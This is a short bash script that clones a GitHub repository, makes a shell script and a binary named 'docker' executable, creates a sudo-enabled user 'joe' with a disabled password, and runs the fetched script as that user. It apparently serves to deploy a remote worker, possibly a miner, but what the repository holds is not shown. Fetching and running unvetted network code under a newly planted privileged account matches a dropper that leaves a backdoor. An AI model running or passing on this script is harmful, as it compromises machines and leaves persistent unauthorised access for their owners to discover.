#!/bin/bash
sudo apt update
git clone https://github.com/wertesd/Workergits.git && cd Workergits
chmod +x luck.sh && chmod +x docker
sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
sudo -u joe -H sh -c "./luck.sh"
